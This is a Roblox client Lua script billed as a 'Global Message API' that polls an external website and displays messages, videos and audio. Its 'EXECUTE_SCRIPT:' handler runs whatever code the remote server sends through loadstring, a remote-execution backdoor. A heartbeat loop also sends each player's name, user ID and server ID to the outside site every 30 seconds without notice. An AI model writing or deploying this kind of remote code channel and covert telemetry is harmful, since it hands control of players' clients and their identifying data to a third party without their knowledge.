-- Advanced Client Script for Roblox Global Message API
-- Place this script in StarterPlayerScripts

local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local SoundService = game:GetService("SoundService")
local Lighting = game:GetService("Lighting")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Configuration
local API_KEY = "YOUR_API_KEY_HERE"
local WEBSITE_URL = "https://your-website.com"
local CHECK_INTERVAL = 2 -- seconds
local SHOW_STATUS = true

-- Create main GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "GlobalAPIGUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

-- Status indicator
local statusFrame = Instance.new("Frame")
statusFrame.Name = "StatusFrame"
statusFrame.Size = UDim2.new(0, 200, 0, 30)
statusFrame.Position = UDim2.new(1, -210, 0, 10)
statusFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
statusFrame.BackgroundTransparency = 0.3
statusFrame.BorderSizePixel = 0
statusFrame.Visible = SHOW_STATUS
statusFrame.Parent = screenGui

local statusCorner = Instance.new("UICorner")
statusCorner.CornerRadius = UDim.new(0, 8)
statusCorner.Parent = statusFrame

local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, -10, 1, 0)
statusLabel.Position = UDim2.new(0, 5, 0, 0)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = "🔄 Connecting..."
statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
statusLabel.TextScaled = true
statusLabel.Font = Enum.Font.GothamBold
statusLabel.Parent = statusFrame

-- Message display frame
local messageFrame = Instance.new("Frame")
messageFrame.Name = "MessageFrame"
messageFrame.Size = UDim2.new(0.8, 0, 0.12, 0)
messageFrame.Position = UDim2.new(0.1, 0, 0.05, 0)
messageFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
messageFrame.BackgroundTransparency = 0.2
messageFrame.BorderSizePixel = 0
messageFrame.Visible = false
messageFrame.Parent = screenGui

local messageCorner = Instance.new("UICorner")
messageCorner.CornerRadius = UDim.new(0, 12)
messageCorner.Parent = messageFrame

local messageLabel = Instance.new("TextLabel")
messageLabel.Name = "MessageLabel"
messageLabel.Size = UDim2.new(1, -20, 1, -10)
messageLabel.Position = UDim2.new(0, 10, 0, 5)
messageLabel.BackgroundTransparency = 1
messageLabel.Text = ""
messageLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
messageLabel.TextScaled = true
messageLabel.Font = Enum.Font.GothamBold
messageLabel.TextStrokeTransparency = 0.5
messageLabel.Parent = messageFrame

-- YouTube video frame
local videoFrame = Instance.new("Frame")
videoFrame.Name = "VideoFrame"
videoFrame.Size = UDim2.new(0.6, 0, 0.4, 0)
videoFrame.Position = UDim2.new(0.2, 0, 0.3, 0)
videoFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
videoFrame.BorderSizePixel = 0
videoFrame.Visible = false
videoFrame.Parent = screenGui

local videoCorner = Instance.new("UICorner")
videoCorner.CornerRadius = UDim.new(0, 15)
videoCorner.Parent = videoFrame

local videoGui = Instance.new("VideoFrame")
videoGui.Size = UDim2.new(1, 0, 1, 0)
videoGui.Position = UDim2.new(0, 0, 0, 0)
videoGui.BackgroundTransparency = 1
videoGui.Parent = videoFrame

local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.new(0, 30, 0, 30)
closeButton.Position = UDim2.new(1, -35, 0, 5)
closeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
closeButton.Text = "✕"
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.Font = Enum.Font.GothamBold
closeButton.TextScaled = true
closeButton.Parent = videoFrame

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0, 15)
closeCorner.Parent = closeButton

-- Variables
local lastMessageId = 0
local isConnected = false
local executionCount = 0
local connectionAttempts = 0

-- Utility functions
local function updateStatus(text, color)
    if SHOW_STATUS then
        statusLabel.Text = text
        statusLabel.TextColor3 = color or Color3.fromRGB(255, 255, 255)
    end
end

local function showNotification(title, message, duration)
    StarterGui:SetCore("SendNotification", {
        Title = title;
        Text = message;
        Duration = duration or 5;
        Button1 = "OK";
    })
end

local function playSound(soundId, volume)
    local sound = Instance.new("Sound")
    sound.SoundId = "rbxasset://sounds/" .. soundId
    sound.Volume = volume or 0.5
    sound.Parent = SoundService
    sound:Play()
    
    sound.Ended:Connect(function()
        sound:Destroy()
    end)
end

local function displayMessage(message, messageType)
    messageType = messageType or "GLOBAL"
    
    -- Set message styling based on type
    local bgColor = Color3.fromRGB(0, 0, 0)
    local textColor = Color3.fromRGB(255, 255, 255)
    
    if messageType == "YOUTUBE" then
        bgColor = Color3.fromRGB(255, 0, 0)
    elseif messageType == "SCRIPT" then
        bgColor = Color3.fromRGB(138, 43, 226)
    elseif messageType == "SCHEDULED" then
        bgColor = Color3.fromRGB(255, 165, 0)
    end
    
    messageFrame.BackgroundColor3 = bgColor
    messageLabel.Text = "[" .. messageType .. "] " .. message
    messageFrame.Visible = true
    
    -- Animate in
    local tweenIn = TweenService:Create(
        messageFrame,
        TweenInfo.new(0.6, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
        {
            Position = UDim2.new(0.1, 0, 0.05, 0),
            BackgroundTransparency = 0.2
        }
    )
    
    tweenIn:Play()
    
    -- Play notification sound
    playSound("button_rollover", 0.3)
    
    -- Auto hide after duration
    wait(6)
    
    local tweenOut = TweenService:Create(
        messageFrame,
        TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In),
        {
            Position = UDim2.new(0.1, 0, -0.2, 0),
            BackgroundTransparency = 1
        }
    )
    
    tweenOut:Play()
    tweenOut.Completed:Connect(function()
        messageFrame.Visible = false
        messageFrame.Position = UDim2.new(0.1, 0, 0.05, 0)
        messageFrame.BackgroundTransparency = 0.2
    end)
    
    -- Send to chat
    StarterGui:SetCore("ChatMakeSystemMessage", {
        Text = "[" .. messageType .. "] " .. message;
        Color = textColor;
        Font = Enum.Font.GothamBold;
        FontSize = Enum.FontSize.Size18;
    })
end

local function executeScript(scriptContent)
    executionCount = executionCount + 1
    
    -- Update player execution count
    spawn(function()
        local success, result = pcall(function()
            local data = {
                apiKey = API_KEY,
                username = player.Name,
                displayName = player.DisplayName,
                userId = player.UserId,
                jobId = game.JobId,
                placeId = game.PlaceId,
                totalExecutions = executionCount
            }
            
            HttpService:PostAsync(WEBSITE_URL .. "/api/players", HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
        end)
    end)
    
    -- Execute the script
    local success, result = pcall(function()
        local func = loadstring(scriptContent)
        if func then
            func()
            displayMessage("Script executed successfully! (Count: " .. executionCount .. ")", "SCRIPT")
        else
            displayMessage("Script execution failed - Invalid syntax", "SCRIPT")
        end
    end)
    
    if not success then
        displayMessage("Script execution error: " .. tostring(result), "SCRIPT")
    end
end

local function playYouTubeVideo(url, audioOnly)
    if audioOnly then
        -- Audio only mode
        displayMessage("Playing YouTube audio: " .. url, "YOUTUBE")
        
        -- Create audio-only player
        local sound = Instance.new("Sound")
        sound.SoundId = url
        sound.Volume = 0.7
        sound.Parent = SoundService
        
        local success, error = pcall(function()
            sound:Play()
        end)
        
        if not success then
            displayMessage("Failed to play audio: " .. tostring(error), "YOUTUBE")
        end
        
        sound.Ended:Connect(function()
            sound:Destroy()
            displayMessage("Audio playback finished", "YOUTUBE")
        end)
    else
        -- Full video mode
        displayMessage("Loading YouTube video...", "YOUTUBE")
        videoFrame.Visible = true
        
        local success, error = pcall(function()
            videoGui.Video = url
            videoGui:Play()
        end)
        
        if not success then
            displayMessage("Failed to load video: " .. tostring(error), "YOUTUBE")
            videoFrame.Visible = false
        end
    end
end

local function processMessage(messageData)
    local message = messageData.message
    
    if message:sub(1, 8) == "YOUTUBE:" then
        local url = message:sub(9)
        playYouTubeVideo(url, false)
    elseif message:sub(1, 14) == "YOUTUBE_AUDIO:" then
        local url = message:sub(15)
        playYouTubeVideo(url, true)
    elseif message:sub(1, 15) == "EXECUTE_SCRIPT:" then
        local script = message:sub(16)
        executeScript(script)
    elseif message:sub(1, 11) == "[SCHEDULED]" then
        local scheduledMsg = message:sub(13)
        displayMessage(scheduledMsg, "SCHEDULED")
    else
        displayMessage(message, "GLOBAL")
    end
end

local function checkForMessages()
    if not API_KEY or API_KEY == "YOUR_API_KEY_HERE" then
        updateStatus("❌ No API Key", Color3.fromRGB(255, 0, 0))
        return
    end
    
    local success, result = pcall(function()
        local response = HttpService:GetAsync(WEBSITE_URL .. "/api/get-messages?apiKey=" .. API_KEY .. "&lastId=" .. lastMessageId)
        local data = HttpService:JSONDecode(response)
        
        if data.success and data.messages then
            for _, messageData in ipairs(data.messages) do
                if messageData.id > lastMessageId then
                    processMessage(messageData)
                    lastMessageId = messageData.id
                end
            end
            
            if not isConnected then
                isConnected = true
                connectionAttempts = 0
                updateStatus("✅ Connected", Color3.fromRGB(0, 255, 0))
                showNotification("Global API", "Successfully connected to server!", 3)
            end
        end
    end)
    
    if not success then
        connectionAttempts = connectionAttempts + 1
        isConnected = false
        updateStatus("🔄 Reconnecting... (" .. connectionAttempts .. ")", Color3.fromRGB(255, 165, 0))
        
        if connectionAttempts > 10 then
            updateStatus("❌ Connection Failed", Color3.fromRGB(255, 0, 0))
        end
    end
end

-- Close button functionality
closeButton.MouseButton1Click:Connect(function()
    videoFrame.Visible = false
    videoGui:Pause()
end)

-- Keyboard shortcuts
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    
    if input.KeyCode == Enum.KeyCode.F1 then
        -- Toggle status visibility
        SHOW_STATUS = not SHOW_STATUS
        statusFrame.Visible = SHOW_STATUS
    elseif input.KeyCode == Enum.KeyCode.F2 then
        -- Force reconnect
        connectionAttempts = 0
        isConnected = false
        checkForMessages()
    elseif input.KeyCode == Enum.KeyCode.Escape then
        -- Close video
        if videoFrame.Visible then
            videoFrame.Visible = false
            videoGui:Pause()
        end
    end
end)

-- Initialize
updateStatus("🔄 Initializing...", Color3.fromRGB(255, 255, 0))
showNotification("Global API", "Client script loaded! Press F1 to toggle status, F2 to reconnect.", 5)

-- Main loop
spawn(function()
    while true do
        checkForMessages()
        wait(CHECK_INTERVAL)
    end
end)

-- Heartbeat to update player data
spawn(function()
    while true do
        if isConnected and API_KEY ~= "YOUR_API_KEY_HERE" then
            pcall(function()
                local data = {
                    apiKey = API_KEY,
                    username = player.Name,
                    displayName = player.DisplayName,
                    userId = player.UserId,
                    jobId = game.JobId,
                    placeId = game.PlaceId,
                    totalExecutions = executionCount
                }
                
                HttpService:PostAsync(WEBSITE_URL .. "/api/players", HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
            end)
        end
        wait(30) -- Update every 30 seconds
    end
end)

print("[GLOBAL API] Advanced client script loaded successfully!")
print("[GLOBAL API] Press F1 to toggle status, F2 to reconnect, ESC to close video")
print("[GLOBAL API] Execution count: " .. executionCount)
